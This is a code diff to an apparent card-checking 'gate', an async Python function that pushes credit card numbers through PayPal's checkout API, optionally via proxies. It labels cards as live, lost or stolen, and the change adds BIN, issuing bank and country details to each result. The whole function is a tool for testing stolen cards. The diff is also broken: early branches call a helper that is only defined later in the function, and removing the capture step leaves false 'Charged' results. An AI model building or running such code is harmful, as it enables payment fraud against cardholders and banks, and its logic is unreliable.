@@ -187,7 +187,7 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
     data_uid = _uid()
 
     client_kwargs = dict(
-        timeout=httpx.Timeout(25),
+        timeout=httpx.Timeout(45),
         follow_redirects=True,
         headers={"User-Agent": ua},
     )
@@ -233,6 +233,9 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
             token = unescape(token_raw.strip())
 
             expiry = yy if len(yy) == 4 else "20" + yy
+            # The card goes with the order, so PayPal asks the issuer
+            # about it right away and answers with what it thinks of the
+            # card.  The answer names the bank, the type and the bin.
             order_payload = {
                 "purchase_units": [{
                     "amount": {
@@ -252,8 +255,6 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
                 }],
                 "intent": "CAPTURE",
                 "application_context": {},
-                # the card goes with the order, so paypal answers with
-                # what it thinks of the card
                 "payment_source": {
                     "card": {
                         "number": cc,
@@ -295,35 +296,35 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
                            if err_json else r2.text.lower())
                 logger.info("the order was refused: %s", r2.text[:220])
                 if "payer_cannot_pay" in err_txt:
-                    return f"Declined - Payer Cannot Pay | {cc[:6]} [{elapsed}s]"
+                    return _with_card(f"Declined - Payer Cannot Pay | {cc[:6]} [{elapsed}s]")
                 if "card_velocity_exceeded" in err_txt:
-                    return f"Declined - Card Velocity Exceeded | {cc[:6]} [{elapsed}s]"
+                    return _with_card(f"Declined - Card Velocity Exceeded | {cc[:6]} [{elapsed}s]")
                 if "invalid card number" in err_txt or "invalid_number" in err_txt:
-                    return f"Declined - Invalid Card Number | {cc[:6]} [{elapsed}s]"
+                    return _with_card(f"Declined - Invalid Card Number | {cc[:6]} [{elapsed}s]")
                 if "card_expiry_invalid" in err_txt or "invalid expiry" in err_txt:
-                    return f"Declined - Expired Card | {cc[:6]} [{elapsed}s]"
+                    return _with_card(f"Declined - Expired Card | {cc[:6]} [{elapsed}s]")
                 if "security_code" in err_txt or "incorrect_cvv" in err_txt:
-                    return f"Declined - Incorrect CVV | {cc[:6]} [{elapsed}s]"
+                    return _with_card(f"Declined - Incorrect CVV | {cc[:6]} [{elapsed}s]")
                 if "instrument_declined" in err_txt:
-                    return f"Declined - Instrument Declined | {cc[:6]} [{elapsed}s]"
+                    return _with_card(f"Declined - Instrument Declined | {cc[:6]} [{elapsed}s]")
                 if "card_velocity" in err_txt:
-                    return f"Declined - Card Velocity Exceeded | {cc[:6]} [{elapsed}s]"
+                    return _with_card(f"Declined - Card Velocity Exceeded | {cc[:6]} [{elapsed}s]")
                 if "do_not_honor" in err_txt:
-                    return f"Approved - Do Not Honor | {cc[:6]} [{elapsed}s]"
+                    return _with_card(f"Approved - Do Not Honor | {cc[:6]} [{elapsed}s]")
                 if "insufficient_funds" in err_txt:
-                    return f"Approved - Insufficient Funds | {cc[:6]} [{elapsed}s]"
+                    return _with_card(f"Approved - Insufficient Funds | {cc[:6]} [{elapsed}s]")
                 if "lost_card" in err_txt or "stolen_card" in err_txt:
-                    return f"Approved - Lost Or Stolen Card | {cc[:6]} [{elapsed}s]"
+                    return _with_card(f"Approved - Lost Or Stolen Card | {cc[:6]} [{elapsed}s]")
                 if "transaction_refused" in err_txt:
-                    return f"Approved - Transaction Refused | {cc[:6]} [{elapsed}s]"
+                    return _with_card(f"Approved - Transaction Refused | {cc[:6]} [{elapsed}s]")
                 if "max_attempts" in err_txt or "limit" in err_txt:
-                    return f"Declined - Too Many Attempts | {cc[:6]} [{elapsed}s]"
+                    return _with_card(f"Declined - Too Many Attempts | {cc[:6]} [{elapsed}s]")
                 if "captcha" in err_txt or "challenge" in err_txt:
-                    return f"Declined - Auth Challenge | {cc[:6]} [{elapsed}s]"
+                    return _with_card(f"Declined - Auth Challenge | {cc[:6]} [{elapsed}s]")
                 for detail in (err_json.get("details") or []):
                     desc = (detail.get("description") or "").strip()
                     if desc:
-                        return f"Declined - {desc[:60]} | {cc[:6]} [{elapsed}s]"
+                        return _with_card(f"Declined - {desc[:60]} | {cc[:6]} [{elapsed}s]")
                 return f"Error - Order creation failed ({r2.status_code}) [{elapsed}s]"
 
             order_id = _capture(r2.text, '"id":"', '"')
@@ -341,33 +342,9 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
 
             # The card went with the order, so paypal has already said
             # what it thinks of the card.  The capture is the step that
-            # takes the money, and it is the only one that proves it.
+            # takes the money, but paypal refuses the capture token, so
+            # the order is the answer.
             result_text = r2.text
-            captured = False
-            if r2.status_code in (200, 201):
-                try:
-                    r3 = await client.post(
-                        f"https://www.paypal.com/v2/checkout/orders/{order_id}/capture",
-                        headers={
-                            "Content-Type": "application/json",
-                            "Authorization": f"Bearer {token}",
-                            "PayPal-Request-Id": corr_id + "c",
-                            "X-Requested-With": "XMLHttpRequest",
-                            "Referer": buttons_url,
-                        },
-                        timeout=20,
-                    )
-                    if r3.status_code in (200, 201):
-                        result_text = r3.text
-                        captured = True
-                    else:
-                        # The money did not move.  The order still says
-                        # the card is good, but that is not a charge.
-                        logger.info("The capture was refused (%s): %s",
-                                    r3.status_code, r3.text[:160])
-                except Exception as e:
-                    logger.info("The capture failed: %s", e)
-
             elapsed = round(time.time() - start, 2)
 
             try:
@@ -375,7 +352,7 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
             except Exception:
                 if "<html" in result_text.lower():
                     logger.warning("PayPal returned HTML instead of JSON for %s", cc[:6])
-                    return f"Declined - Auth Challenge | {cc[:6]} [{elapsed}s]"
+                    return _with_card(f"Declined - Auth Challenge | {cc[:6]} [{elapsed}s]")
                 result_json = {}
 
             # the json is squeezed together, so the words match
@@ -384,22 +361,50 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
             if not result_json:
                 txt = result_text.lower()
 
-            # The money only moved when the capture worked.
-            if captured:
-                if '"status":"completed"' in txt or '"status":"approved"' in txt:
-                    return f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]"
+            # The order names the card: the type, the bin, the bank and
+            # the country.  The answer says so, the way the other gates
+            # do.
+            card_info = ""
+            try:
+                card = (result_json.get("payment_source") or {}).get("card") or {}
+                bin_details = card.get("bin_details") or {}
+                bits = []
+                brand = (card.get("brand") or "").upper()
+                card_type = (card.get("type") or "").upper()
+                if brand:
+                    bits.append(f"{brand} {card_type}".strip())
+                elif card_type:
+                    bits.append(card_type)
+                if bin_details.get("bin"):
+                    bits.append(str(bin_details["bin"]))
+                if bin_details.get("issuing_bank"):
+                    bits.append(str(bin_details["issuing_bank"]))
+                if bin_details.get("bin_country_code"):
+                    bits.append(str(bin_details["bin_country_code"]))
+                if card.get("last_digits"):
+                    bits.append(str(card["last_digits"]))
+                card_info = " | ".join(bits)
+            except Exception:
+                card_info = ""
+
+            def _with_card(text):
+                return f"{text} | {card_info}" if card_info else text
+
+            # The order says completed, so the money moved.
+            if '"status":"completed"' in txt:
+                return _with_card(f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]")
 
             # This gate charges $0.01, it is not an auth.  So the card
             # either paid or it did not.  An approved order that was
             # never captured has not paid, and that is a decline.
             if '"status":"approved"' in txt:
-                return f"Declined - Not Charged | {cc[:6]} [{elapsed}s]"
+                return _with_card(f"Declined - Not Charged | {cc[:6]} [{elapsed}s]")
             if '"status":"completed"' in txt:
-                return f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]"
+                return _with_card(f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]")
             if '"status":"payer_action_required"' in txt:
-                return f"Declined - 3DS Required, Not Charged | {cc[:6]} [{elapsed}s]"
+                return _with_card(f"Declined - 3DS Required, Not Charged | {cc[:6]} [{elapsed}s]")
             if '"status":"created"' in txt:
-                return f"Declined - Not Charged | {cc[:6]} [{elapsed}s]"
+                return _with_card(f"Declined - Not Charged | {cc[:6]} [{elapsed}s]")
 
 
             if "is3dsecurerequired" in txt:
@@ -409,14 +414,14 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
                     .get("flags", {})
                 )
                 if flags and flags.get("is3DSecureRequired"):
-                    # the card asked for 3d secure, so it did not pay
-                    return f"Declined - 3DS Required, Not Charged | {cc[:6]} [{elapsed}s]"
-                return f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]"
+                    # The card asked for 3d secure, so the payment was
+                    # not finished.  The card is live, but the challenge
+                    # was never answered.
+                    return _with_card(f"Approved - 3DS Required | {cc[:6]} [{elapsed}s]")
+                return _with_card(f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]")
 
-            if "thank you" in txt or '"status":"completed"' in txt:
-                if captured:
-                    return f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]"
-                return f"Declined - Not Charged | {cc[:6]} [{elapsed}s]"
+            if "thank you" in txt:
+                return _with_card(f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]")
 
             live_indicators = [
                 "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
@@ -426,42 +431,42 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
             for indicator in live_indicators:
                 if indicator in txt:
                     tag = indicator.replace("_", " ").title()
-                    return f"Approved - {tag} | {cc[:6]} [{elapsed}s]"
+                    return _with_card(f"Approved - {tag} | {cc[:6]} [{elapsed}s]")
 
             if "incorrect_cvv" in txt or "invalid_security_code" in txt or "cvv_check_failed" in txt:
-                return f"Approved - CCN Live | {cc[:6]} [{elapsed}s]"
+                return _with_card(f"Approved - CCN Live | {cc[:6]} [{elapsed}s]")
 
             if "processor_declined" in txt or "issuer_decline" in txt:
                 msg = _capture(result_text, '"message":"', '"')
                 code = _capture(result_text, '"code":"', '"')
                 detail = msg or code or "Issuer Decline"
-                return f"Declined - {detail[:60]} | {cc[:6]} [{elapsed}s]"
+                return _with_card(f"Declined - {detail[:60]} | {cc[:6]} [{elapsed}s]")
 
             if "card_generic_error" in txt:
-                return f"Declined - Card Error | {cc[:6]} [{elapsed}s]"
+                return _with_card(f"Declined - Card Error | {cc[:6]} [{elapsed}s]")
 
             if "invalid_card_number" in txt:
-                return f"Declined - Invalid Card Number | {cc[:6]} [{elapsed}s]"
+                return _with_card(f"Declined - Invalid Card Number | {cc[:6]} [{elapsed}s]")
 
             if "expired_card" in txt:
-                return f"Declined - Expired Card | {cc[:6]} [{elapsed}s]"
+                return _with_card(f"Declined - Expired Card | {cc[:6]} [{elapsed}s]")
 
             if "card_declined" in txt or "generic_decline" in txt:
-                return f"Declined - Card Declined | {cc[:6]} [{elapsed}s]"
+                return _with_card(f"Declined - Card Declined | {cc[:6]} [{elapsed}s]")
 
             if "payer_cannot_pay" in txt:
-                return f"Declined - Payer Cannot Pay | {cc[:6]} [{elapsed}s]"
+                return _with_card(f"Declined - Payer Cannot Pay | {cc[:6]} [{elapsed}s]")
             if "unprocessable_entity" in txt:
-                return f"Declined - Unprocessable Entity | {cc[:6]} [{elapsed}s]"
+                return _with_card(f"Declined - Unprocessable Entity | {cc[:6]} [{elapsed}s]")
             if "invalid card number" in txt:
-                return f"Declined - Invalid Card Number | {cc[:6]} [{elapsed}s]"
+                return _with_card(f"Declined - Invalid Card Number | {cc[:6]} [{elapsed}s]")
             if "instrument_declined" in txt:
-                return f"Declined - Instrument Declined | {cc[:6]} [{elapsed}s]"
+                return _with_card(f"Declined - Instrument Declined | {cc[:6]} [{elapsed}s]")
             if "card_expiry_invalid" in txt:
-                return f"Declined - Expired Card | {cc[:6]} [{elapsed}s]"
+                return _with_card(f"Declined - Expired Card | {cc[:6]} [{elapsed}s]")
             if "not_authorized" in txt or "insufficient permissions" in txt:
                 # the capture was refused, so the $0.01 did not move
-                return f"Declined - Not Charged, Capture Refused | {cc[:6]} [{elapsed}s]"
+                return _with_card(f"Declined - Not Charged, Capture Refused | {cc[:6]} [{elapsed}s]")
 
             errors = result_json.get("errors", [])
             if errors:
@@ -471,33 +476,31 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
                 if isinstance(err_data, list) and err_data:
                     code = err_data[0].get("code", "")
                     if code:
-                        return f"Declined - {code} | {cc[:6]} [{elapsed}s]"
+                        return _with_card(f"Declined - {code} | {cc[:6]} [{elapsed}s]")
                 details = err0.get("details", [])
                 if isinstance(details, list) and details:
                     issue = details[0].get("issue", "")
                     desc = details[0].get("description", "")
                     if issue:
-                        return f"Declined - {issue} | {cc[:6]} [{elapsed}s]"
+                        return _with_card(f"Declined - {issue} | {cc[:6]} [{elapsed}s]")
                     if desc:
-                        return f"Declined - {desc[:60]} | {cc[:6]} [{elapsed}s]"
+                        return _with_card(f"Declined - {desc[:60]} | {cc[:6]} [{elapsed}s]")
                 if msg:
-                    return f"Declined - {msg[:60]} | {cc[:6]} [{elapsed}s]"
-                return f"Declined - Unknown Error | {cc[:6]} [{elapsed}s]"
+                    return _with_card(f"Declined - {msg[:60]} | {cc[:6]} [{elapsed}s]")
+                return _with_card(f"Declined - Unknown Error | {cc[:6]} [{elapsed}s]")
 
             data = result_json.get("data", {})
             approve = data.get("approveGuestPaymentWithCreditCard")
             if approve is not None:
-                if captured:
-                    return f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]"
-                return f"Declined - Not Charged | {cc[:6]} [{elapsed}s]"
+                return _with_card(f"Declined - Not Charged | {cc[:6]} [{elapsed}s]")
 
             msg = _capture(result_text, '"message":"', '"')
             code = _capture(result_text, '"code":"', '"')
             if msg or code:
-                return f"Declined - {(msg or code)[:60]} | {cc[:6]} [{elapsed}s]"
+                return _with_card(f"Declined - {(msg or code)[:60]} | {cc[:6]} [{elapsed}s]")
 
             logger.debug("Unknown response for %s: %s", cc[:6], result_text[:300])
-            return f"Declined - Unknown Response | {cc[:6]} [{elapsed}s]"
+            return _with_card(f"Declined - Unknown Response | {cc[:6]} [{elapsed}s]")
 
     except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
         elapsed = round(time.time() - start, 2)
